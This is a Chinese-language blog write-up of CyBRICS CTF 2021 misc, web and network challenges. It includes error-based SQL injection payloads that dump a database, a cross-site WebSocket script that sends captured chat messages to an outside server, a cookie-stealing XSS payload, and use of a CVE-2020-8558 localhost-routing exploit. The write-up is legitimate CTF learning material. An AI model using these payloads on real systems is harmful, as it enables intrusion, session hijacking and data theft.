---
title: "CybricsCTF2021 Wp"
slug: "cybricsctf2021-wp"
description: "依旧是签到水平，一些简单的misc+web+network"
date: 2021-07-29T17:02:12+08:00
categories: ["CTF"]
series: []
tags: ["wp", "participate"]
draft: false
toc: true
---

## Mic Check (Cyber, Baby, 50 pts)

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> Those organizers are changing [game rules](https://cybrics.net/rules) all the time! There’s a flag there, and it’s not that easy to capture.
>
> **Also be sure to join [@cybrics Telegram chat](https://t.me/cybrics)** for challenge-related announcements and contacting orgs in case all goes wrong
>
> **Added at 10:10 —** looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely

![image-20210724194428638](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png)

## Scanner (rebyC, Baby, 50 pts)

> Author: Mikhail Driagunov ([@aethereternity](https://t.me/aethereternity))
>
> Check out this cool new [**game**](https://scanner-cybrics2021.ctf.su/)!
>
> I heard they serve flags at level 5.

不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面

首先用[Gif Super](https://gifsuper.com/)把帧间隔调为300ms，然后裁剪出中间有用的部分 放入[GIF动态图片分解](http://www.atoolbox.net/Tool.php?Id=979)中看结果 都有在线工具就很方便

![image-20210724202614568](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png)

所以这个破玩意到底是啥？猪？还是刺猬？
别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone.... 最后一个是二维码 比较麻烦

![image-20210724203314255](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png)

再稍微调整一下尺寸，扫描就行了![image-20210724203713402](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png)

## rm -rf’er (CTB, Baby, 166 pts)

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> Alarm! We accidentally did `rm -rf /*` on a very important server. Now all that’s left is one shell session.
>
> ```
> ssh rmrfer@178.154.210.26
> Password: sa7Neiyi
> ```
>
> Rescue the **flag.txt** file from one of the directories by only using your shell
>
> **Added at 13:45 —** frequent question: yes, if you found `flag.txt`, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you

这个题 emmmmm
只要ssh一连接就会自动执行`rm -rf /*`的指令，当反应过来的时候系统已经删的连ls指令都不剩了

![image-20210729003620922](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png)

先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了`rm -rf /*`，之后就可以顺畅的穿梭于这个buildbox之间拿flag了

预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成"read"的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中`echo $<`命令相当于`read`函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload `(echo "$<") < /etc/ctf/flag.txt`，即 读取flag.txt并输出

![image-20210729005544665](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png)

## Ad Network (Web, Baby, 50 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.
>
> [Adnetwork website](http://adnetwork-cybrics2021.ctf.su/)
>
> There is a flag 1337 redirects deep into the network...

~~这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？~~

emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
这个图在昨天做的时候看到， 内容是 *awesome ad from adnetwork*，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的...... ~~（都怪edge!!!~~

![image-20210725133924877](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png)

点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄

![image-20210725134346221](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png)

```python
import requests

url = "http://adnetwork-cybrics2021.ctf.su/adnetwork"
for _ in range(1337):
	r = requests.get(url, allow_redirects=False)
    url = r.text[9:-18]
print(url)

```

emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}

比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便

```python
import requests

session = requests.Session()
session.max_redirects = 1337

url = "http://adnetwork-cybrics2021.ctf.su/adnetwork"
r = session.get(url, allow_redirects=True)

print(r.text)
print(r.url)

```



## Announcement (Web, Easy, 60 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> Ladies and gentlemen!
>
> Allow us to introduce a brand new project —
> ⚐ The Flag
>
> [Announcement website](http://announcement-cybrics2021.ctf.su/)

简约漂亮的前端

有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&email=xxxx
尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5('1@1.com') 随email而改变，尝试注入

```
digest=76af11f3eaf7b12e72d7d88e4cf2ee01&email='or'1		// 回显正常 无报错
digest=c3593d255957d60d5d489ae682da8aee&email=1')#		// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&email=1',1)#	// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
```

确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？

```sql
insert into table_name (email, timestamp) values (email, now());
```

可利用的部分是可以插入的email，报错注入

```
digest=e1e79bd6fafe38f7073ec1f3ef1513fa&email=1',1 or updatexml(1,concat(0x7e,database()),0))#		// Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '	// Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '	// Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '	// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
```

没什么好说的，经典报错注入流程：确定字段数->爆数据库名(announcement)->表名(emails, logs)->字段名(log)->具体数据 拿flag

## Multichat (Web, Medium, 138 pts)

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.
>
> Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): "`Hey, i forgot the flag. Can you remind me?`". Then admin will tell him the flag.
>
> [Multichat website](http://multichat-cybrics2021.ctf.su/)
>
> Team token for the support call: `p32vhJKrnx_hajUc8nLTFw`

聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样

抓包，看到了`Connection: Upgrade`  `Upgrade: websocket`，这个聊天室是建立了一个websocket连接

![image-20210724225447805](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png)（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面

链接里的一个csrf攻击的实例跟这个有点像了

![image-20210724232946228](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png)

但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（*Admin and tech support are members of a secret chat room.*）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag

（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）

![image-20210728001013129](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png)

![image-20210728001122843](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png)

5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是[来自w&m的脚本](https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw)

```html
<html>
<head>
</head>
<body>
<script type="text/javascript">
    var conn;
    function connect() {

            conn = new WebSocket("ws://multichat-cybrics2021.ctf.su/ws");
            conn.onclose = function (evt) {
                var item = "";
                if (evt.code === 1003) {
                    item = `Status: ${evt.reason}`;
                } else {
                    item = "Connection closed.";
                }
                fetch("http://api.chara.pub:1337/aaa.txt?"+encodeURIComponent(item))
            };
            conn.onopen = function (evt) {
                fetch("http://api.chara.pub:1337/aaa.txt?"+encodeURIComponent("connected"))
            };
            conn.onmessage = function (evt) {
                fetch("http://api.chara.pub:1337/aaa.txt?"+encodeURIComponent(evt.data))
            };
            function b(){
                conn.send("Hey, i forgot the flag. Can you remind me?")
            }
            setTimeout(b,2000);
    }
    window.onload = function () {
        connect();
    };
</script>
</body>
<html>
```

或者非预期解：在url部分进行xss，payload: `javascript:location.href='http://vps/?cookie='+document.cookie`（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag

![image-20210729144122926](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png)

![image-20210729143946243](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png)



参考：[HTML5 WebSocket](https://www.runoob.com/html/html5-websocket.html)  |  [WebSocket安全问题分析](https://wiki.wgpsec.org/knowledge/web/websocket-sec.html)    [WebSocket断开原因分析](https://segmentfault.com/a/1190000014582485)  |  [Request.mode](https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode)    [使用 Fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch)  |  [WorkerOrGlobalScope.fetch()](https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch)  |  [Burpsuite Collaborator模块详解](https://www.freebuf.com/news/193447.html)  |  [Running Your Instance of Burp Collaborator Server](https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/)（列入待完成计划

## ASCII Terminal (Network, Baby, 116 pts)

> Author: Artur Khanov ([@awengar](https://t.me/awengar))
>
> At `138.68.83.253:3333` you have an ASCII terminal. It really works, check with the [**id command**](https://cybrics.net/files/id.txt)

nc连上以后可以看到一个bash $，题目的提示是"ASCII termial"

![image-20210728231402633](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png)

把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具

toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如

![image-20210728234413850](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png)

可以玩出很多花样~

![image-20210728234351668](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png)

书归正题，这里使用`toilet -f bigascii9 +command`的命令生成结果，将空格换为 `.`再发送即可

```
toilet -f bigascii9 ls > ls.txt
cat ls.txt | nc 138.68.83.253 3333 > ls_result.txt
toilet -f bigascii9 'cat flag.txt' > cat.txt
cat cat.txt | nc 138.68.83.253 2333 > flag.txt
```

（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的`%s/\s/./g`命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下

![image-20210729002105318](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png)

最后flag：cybrics{T3553R4C7_15_GOOD}

————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到[录播视频](https://www.youtube.com/watch?v=SFnj6DRTIzE&t=2605s)中看



参考：[调皮捣蛋的Linux下有趣终端的合集](https://www.shuzhiduo.com/A/RnJW9QLBdq/)  |  [Linux Fun - 如何在终端中创建ASCII文本横幅](https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal)  |  [Neofetch - 显示具有分发标志的Linux系统信息](https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/)

## LX-100 (Network, Easy, 192 pts)

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.
>
> Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.
>
> [**lx100.pcap**](https://cybrics.net/files/lx100.pcap)

（说实话，pacp包是真的不会看TAT

首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是[官方视频中](https://www.youtube.com/watch?v=Sf_0f8PWNuI&t=80s)确实这样可以成功 emmmm

```
tshark -r lx100.pcap -Y  'udp.dstport == 60524' -Tfields -e data.data > hex.txt
php -a
foreach(file("hex.txt")as $i => $ln) {file_put_contents("frame$i.jpg",hex2bin(trim($ln)));}
```

（以下是在[别的wp](https://scavengersecurity.com/posts/cybrics-lx100/)中看到的py脚本： 可成功复现 导出455张jpg图

```python
import pyshark

cap = pyshark.FileCapture('lx100.pcap')
count = 0
for packet in cap:
	if "UDP" in packet and int(packet['udp'].srcport) == 65415:
		count = count + 1
		udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find('ffd8ffdb'):])
		file_out = open('out_files/' + str(count) + '_packet.jpg', 'wb')
		file_out.write(udp_bytes)
```

![235_packet](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg)

~~放大 再放大 每一根~~ 最后的flag是 `cybrics{Lost_Secrets_In_The_AIr}`

## localhost (Network, Hard, 267 pts)

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.
>
> ```
> ssh localhost@109.233.61.10
> Password: ohx7eeQu
> ```
>
> Your team token > Sw0T5cecsfJfaKApOiKzsA

先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水

![image-20210729122432345](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png)

自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段`nmap -sS -Pn 10.193.10.7/24`

![image-20210729131318834](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png)

发现10.193.10.180的80端口开放，用curl访问

![image-20210729131419115](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png)

提示*Flag-containing-Records* 接着访问两个超链接的内容

`curl 10.193.10.180/redis.conf`是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：

```
bind 127.0.0.1
protected-mod yes
port 6379
```

`curl 10.193.10.180/sysctl.conf`也是相关的配置文件 只有一句没被注释

```
net.ipv4.conf.all.route_localnet=1
```

查google，发现了这些：[net.ipv4.conf.all.route_localnet=1 opens security issue #90259](https://github.com/kubernetes/kubernetes/issues/90259)  |  [POC-2020-8558](https://github.com/tabbysable/POC-2020-8558)

是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：

> In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the `net.ipv4.conf.all.route_localnet=1` sysctl setting. According to the kernel documentation, this setting makes the kernel "not consider loopback addresses as martian" -- a consequence of which is that they could be accessed by other nodes on the network. That's a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!
>
> ......
>
> A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting `net.ipv4.conf.all.route_localnet=1` changes that -- it allows 127.0.0.1 packets to be sent and received as if they were not special.
>
> So, if an attacker has a local connection to a target node with `net.ipv4.conf.all.route_localnet=1`, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.
>
> Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker's Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.

（不得不说ipv4当初把整个`127.0.0.0/8`的地址都给了本地回环用真的是太慷慨了...... 到ipv6就只有一个`:: 1`

在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明

> **tst-2020-8558.py**
> Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to `127.0.0.1` via your target, and looks to see if there is a reply.
>
> **poc-2020-8558.py**
> Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
> Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
> Because this script uses raw sockets to send and receive the "localhost" packets, it works fine inside a normal unprivileged container.

因为需要nc 所以另开一个shell

![image-20210729153443403](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png)

![image-20210729153501930](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png)



参考：[wp](https://jan.show/?p=128)  |  [为什么整个127.*网段都被拿来当做环回地址了？](https://www.zhihu.com/question/49866806)

------

本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，[此处是参考wp](https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw)

道阻且长呀，暑假要好好努力咯 (つд⊂)
参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆